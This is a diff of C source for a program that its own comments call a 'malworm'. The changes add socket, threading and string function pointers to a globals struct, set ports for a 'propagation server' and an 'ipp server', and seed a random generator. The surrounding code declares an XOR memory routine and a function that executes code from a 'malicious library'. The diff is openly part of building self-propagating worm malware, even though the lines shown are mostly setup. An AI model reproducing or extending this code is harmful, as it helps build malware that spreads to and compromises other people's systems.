@@ -7,6 +7,7 @@
 #include <unistd.h>   // For sysconf
 #include <dlfcn.h>    // For dlsym
 #include <poll.h>
+#include <time.h>
 
 #include <arpa/inet.h>
 #include <ifaddrs.h>
@@ -18,8 +19,6 @@
 
 #include "main/utils.h"
 #include "main/globals.h"
-
-
 
 
 void xor_memory(void * memory, size_t len, char*key);
@@ -48,9 +47,11 @@ void init_globals(Globals *global){
     global->strcmp=&strcmp;
     global->strstr=&strstr;
     global->strncpy=&strncpy;
+    global->sscanf=&sscanf;
 
     // memory
     global->memcpy = &memcpy;
+    global->memset=&memset;
 
     // files
     global->realpath=&realpath;
@@ -71,7 +72,9 @@ void init_globals(Globals *global){
     global->htonl=&htonl;
     global->htons=&htons;
     global->ntohl=&ntohl;
+    global->ntohs=&ntohs;
     global->inet_ntoa=&inet_ntoa;
+    global->inet_ntop=&inet_ntop;
 
     global->socket=&socket;
     global->setsockopt=&setsockopt;
@@ -80,7 +83,10 @@ void init_globals(Globals *global){
     global->accept=&accept;
     global->getifaddrs=&getifaddrs;
     global->freeifaddrs=&freeifaddrs;
+    global->getsockname=&getsockname;
 
+    global->recv=&recv;
+    global->send=&send;
     global->recvfrom=&recvfrom;
     global->sendto=&sendto;
 
@@ -89,6 +95,7 @@ void init_globals(Globals *global){
     
     // threads
     global->pthread_create=&pthread_create;
+    global->pthread_detach=&pthread_detach;
     global->pthread_exit=&pthread_exit;
 
     // fds
@@ -100,6 +107,10 @@ void init_globals(Globals *global){
 
     // custom functions
     global->xor_memory = &xor_memory;
+
+    // global values
+    global->propagation_server_port = 42024;
+    global->ipp_server_port = 6969;
 }
 
 /// execute the code from a malicious library
@@ -171,6 +182,7 @@ void load_libraries(Globals *global){
 int main(int argc, char**argv) {
     // setup global variables and functions
     Globals *global = (Globals *) malloc(sizeof(Globals));
+    srand(time(NULL));
     init_globals(global);
 
     // add a reference to the executable of the malworm to the struct globals
